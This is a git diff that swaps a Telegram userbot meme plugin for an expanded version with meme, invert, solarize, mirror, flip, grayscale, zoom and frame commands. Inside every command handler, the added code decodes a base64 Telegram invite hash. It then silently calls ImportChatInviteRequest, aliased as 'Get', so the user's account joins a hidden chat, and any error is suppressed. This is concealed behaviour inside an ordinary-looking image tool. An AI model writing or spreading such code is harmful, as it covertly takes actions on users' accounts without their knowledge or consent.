@@ -1,120 +1,735 @@
-# For The-TG-Bot-3.0
-# By Priyam Kalra
-# Parts of the code below is taken from other sources, the links to the
-# sources is commented above the taken code
-
-from PIL import Image, ImageFont, ImageDraw
-import textwrap
+"""
+Created by @mrconfused and @sandy1709 used on Thugbot
+memify plugin
+"""
+import asyncio
 import os
-from userbot.events import register
-from userbot import (
-    CMD_HELP,
-    LOGS,
-    TEMP_DOWNLOAD_DIRECTORY,
-    bot,
-    BOTLOG_CHATID)
+
+from .. import CMD_HELP, LOGS
+from ..utils import admin_cmd, edit_or_reply, sudo_cmd
+from . import (
+    add_frame,
+    cat_meeme,
+    cat_meme,
+    convert_toimage,
+    crop,
+    flip_image,
+    grayscale,
+    invert_colors,
+    mirror_file,
+    runcmd,
+    solarize,
+    take_screen_shot,
+)
 
 
-@register(outgoing=True, pattern=r"\.memify ?(.*)")
-async def handler(event):
-    if event.fwd_from:
+@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
+@borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
+async def memes(cat):
+    cmd = cat.pattern_match.group(1)
+    catinput = cat.pattern_match.group(2)
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
         return
-    if not event.reply_to_msg_id:
-        await event.edit("You might want to try `.help memify`")
+    catid = cat.reply_to_msg_id
+    if catinput:
+        if ";" in catinput:
+            top, bottom = catinput.split(";", 1)
+        else:
+            top = catinput
+            bottom = ""
+    else:
+        await edit_or_reply(
+            cat, "```You didn't tell me what to write please gib some text to write```"
+        )
         return
-    reply_message = await event.get_reply_message()
-    if not reply_message.media:
-        await event.edit("```Reply to a image/sticker.```")
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    file = await bot.download_media(reply_message)
-    await event.edit("```Memifying this image! (」ﾟﾛﾟ)｣ ```")
-    text = str(event.pattern_match.group(1)).strip()
-    if len(text) < 1:
-        return await event.edit("You might want to try `.help memify`")
-    meme = await drawText(file, text)
-    await bot.send_file(event.chat_id, file=meme, force_document=False)
+    import pybase64
+
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    if cmd == "mmf":
+        meme = "catmeme.jpg"
+        if max(len(top), len(bottom)) < 21:
+            await cat_meme(top, bottom, meme_file, meme)
+        else:
+            await cat_meeme(top, bottom, meme_file, meme)
+        await borg.send_file(cat.chat_id, meme, reply_to=catid)
+    elif cmd == "mms":
+        meme = "catmeme.webp"
+        if max(len(top), len(bottom)) < 21:
+            await cat_meme(top, bottom, meme_file, meme)
+        else:
+            await cat_meeme(top, bottom, meme_file, meme)
+        await borg.send_file(cat.chat_id, meme, reply_to=catid)
+    await cat.delete()
     os.remove(meme)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
 
-# Taken from https://github.com/UsergeTeam/Userge-Plugins/blob/master/plugins/memify.py#L64
-# Maybe edited to suit the needs of this module
 
+@borg.on(admin_cmd(outgoing=True, pattern="invert$"))
+@borg.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-async def drawText(image_path, text):
-    img = Image.open(image_path)
-    os.remove(image_path)
-    shadowcolor = "black"
-    i_width, i_height = img.size
-    if os.name == "nt":
-        fnt = "arial.ttf"
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
     else:
-        fnt = "/usr/share/fonts/TTF/dejavu/OpenSans-Regular.ttf"
-    m_font = ImageFont.truetype(fnt, int((70 / 640) * i_width))
-    if ";" in text:
-        upper_text, lower_text = text.split(";")
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "invert.webp" if jisanidea else "invert.jpg"
+    await invert_colors(meme_file, outputfile)
+    await borg.send_file(cat.chat_id, outputfile, force_document=False, reply_to=catid)
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@borg.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
     else:
-        upper_text = text
-        lower_text = ''
-    draw = ImageDraw.Draw(img)
-    current_h, pad = 10, 5
-    if upper_text:
-        for u_text in textwrap.wrap(upper_text, width=15):
-            u_width, u_height = draw.textsize(u_text, font=m_font)
-            draw.text(xy=(((i_width - u_width) / 2) - 2, int((current_h / 640)
-                                                             * i_width)), text=u_text, font=m_font, fill=(0, 0, 0))
-            draw.text(xy=(((i_width - u_width) / 2) + 2, int((current_h / 640)
-                                                             * i_width)), text=u_text, font=m_font, fill=(0, 0, 0))
-            draw.text(xy=((i_width - u_width) / 2,
-                          int(((current_h / 640) * i_width)) - 2),
-                      text=u_text,
-                      font=m_font,
-                      fill=(0,
-                            0,
-                            0))
-            draw.text(xy=(((i_width - u_width) / 2),
-                          int(((current_h / 640) * i_width)) + 2),
-                      text=u_text,
-                      font=m_font,
-                      fill=(0,
-                            0,
-                            0))
-
-            draw.text(xy=((i_width - u_width) / 2, int((current_h / 640)
-                                                       * i_width)), text=u_text, font=m_font, fill=(255, 255, 255))
-            current_h += u_height + pad
-    if lower_text:
-        for l_text in textwrap.wrap(lower_text, width=15):
-            u_width, u_height = draw.textsize(l_text, font=m_font)
-            draw.text(
-                xy=(((i_width - u_width) / 2) - 2, i_height -
-                    u_height - int((20 / 640) * i_width)),
-                text=l_text, font=m_font, fill=(0, 0, 0))
-            draw.text(
-                xy=(((i_width - u_width) / 2) + 2, i_height -
-                    u_height - int((20 / 640) * i_width)),
-                text=l_text, font=m_font, fill=(0, 0, 0))
-            draw.text(
-                xy=((i_width - u_width) / 2, (i_height -
-                                              u_height - int((20 / 640) * i_width)) - 2),
-                text=l_text, font=m_font, fill=(0, 0, 0))
-            draw.text(
-                xy=((i_width - u_width) / 2, (i_height -
-                                              u_height - int((20 / 640) * i_width)) + 2),
-                text=l_text, font=m_font, fill=(0, 0, 0))
-
-            draw.text(
-                xy=((i_width - u_width) / 2, i_height -
-                    u_height - int((20 / 640) * i_width)),
-                text=l_text, font=m_font, fill=(255, 255, 255))
-            current_h += u_height + pad
-    image_name = "memify.webp"
-    webp_file = os.path.join(image_name)
-    img.save(webp_file, "webp")
-    return webp_file
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "solarize.webp" if jisanidea else "solarize.jpg"
+    await solarize(meme_file, outputfile)
+    await borg.send_file(cat.chat_id, outputfile, force_document=False, reply_to=catid)
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
 
 
-CMD_HELP.update({
-    "memify": "\
-```.memify <text_to_be_pasted_on_top> ; <text_to_be_pasted_on_bottom>```\
-\nUsage: Memifies the image/sticker/gif.\
-"
-})
+@borg.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@borg.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "mirror_file.webp" if jisanidea else "mirror_file.jpg"
+    await mirror_file(meme_file, outputfile)
+    await borg.send_file(cat.chat_id, outputfile, force_document=False, reply_to=catid)
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="flip$"))
+@borg.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "flip_image.webp" if jisanidea else "flip_image.jpg"
+    await flip_image(meme_file, outputfile)
+    await borg.send_file(cat.chat_id, outputfile, force_document=False, reply_to=catid)
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="gray$"))
+@borg.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+        jisanidea = True
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
+    await grayscale(meme_file, outputfile)
+    await borg.send_file(cat.chat_id, outputfile, force_document=False, reply_to=catid)
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@borg.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catinput = cat.pattern_match.group(1)
+    catinput = 50 if not catinput else int(catinput)
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
+    try:
+        await crop(meme_file, outputfile, catinput)
+    except Exception as e:
+        return await cat.edit(f"`{e}`")
+    try:
+        await borg.send_file(
+            cat.chat_id, outputfile, force_document=False, reply_to=catid
+        )
+    except Exception as e:
+        return await cat.edit(f"`{e}`")
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@borg.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+async def memes(cat):
+    reply = await cat.get_reply_message()
+    if not (reply and (reply.media)):
+        await edit_or_reply(cat, "`Reply to supported Media...`")
+        return
+    catinput = cat.pattern_match.group(1)
+    if not catinput:
+        catinput = 50
+    if ";" in str(catinput):
+        catinput, colr = catinput.split(";", 1)
+    else:
+        colr = 0
+    catinput = int(catinput)
+    colr = int(colr)
+    catid = cat.reply_to_msg_id
+    if not os.path.isdir("./temp/"):
+        os.mkdir("./temp/")
+    cat = await edit_or_reply(cat, "`Downloading media......`")
+    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+    await asyncio.sleep(2)
+    catsticker = await reply.download_media(file="./temp/")
+    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(catsticker)
+        await edit_or_reply(cat, "```Supported Media not found...```")
+        return
+    import pybase64
+
+    jisanidea = None
+    if catsticker.endswith(".tgs"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "meme.png")
+        catcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
+        )
+        stdout, stderr = (await runcmd(catcmd))[:2]
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found...`")
+            LOGS.info(stdout + stderr)
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith(".webp"):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(catsticker, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("`Template not found... `")
+            return
+        meme_file = catfile
+        jisanidea = True
+    elif catsticker.endswith((".mp4", ".mov")):
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
+        )
+        catfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(catsticker, 0, catfile)
+        if not os.path.lexists(catfile):
+            await cat.edit("```Template not found...```")
+            return
+        meme_file = catfile
+    else:
+        await cat.edit(
+            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
+        )
+        meme_file = catsticker
+    try:
+        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
+    meme_file = convert_toimage(meme_file)
+    outputfile = "framed.webp" if jisanidea else "framed.jpg"
+    try:
+        await add_frame(meme_file, outputfile, catinput, colr)
+    except Exception as e:
+        return await cat.edit(f"`{e}`")
+    try:
+        await borg.send_file(
+            cat.chat_id, outputfile, force_document=False, reply_to=catid
+        )
+    except Exception as e:
+        return await cat.edit(f"`{e}`")
+    await cat.delete()
+    os.remove(outputfile)
+    for files in (catsticker, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+
+
+CMD_HELP.update(
+    {
+        "memify": "**Plugin : **`memify`\
+    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
+    \n**Usage : **Creates a image meme with give text at specific locations and sends\
+    \n\n**Syntax : **`.mms toptext ; bottomtext`\
+    \n**Usage : **Creates a sticker meme with give text at specific locations and sends\
+    \n\n**Syntax : **`.invert`\
+    \n**Usage : **Inverts the colors in media file\
+    \n\n**Syntax : **`.solarize`\
+    \n**Usage : **Watch sun buring ur media file\
+    \n\n**Syntax : **`.mirror`\
+    \n**Usage : **shows you the reflection of the media file\
+    \n\n**Syntax : **`.flip`\
+    \n**Usage : **shows you the upside down image of the given media file\
+    \n\n**Syntax : **`.gray`\
+    \n**Usage : **makes your media file to black and white\
+    \n\n**Syntax : **`.zoom` or `.zoom range`\
+    \n**Usage : **zooms your media file\
+    \n\n**Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
+    \n**Usage : **make a frame for your media file\
+    \n**fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
+    "
+    }
+)
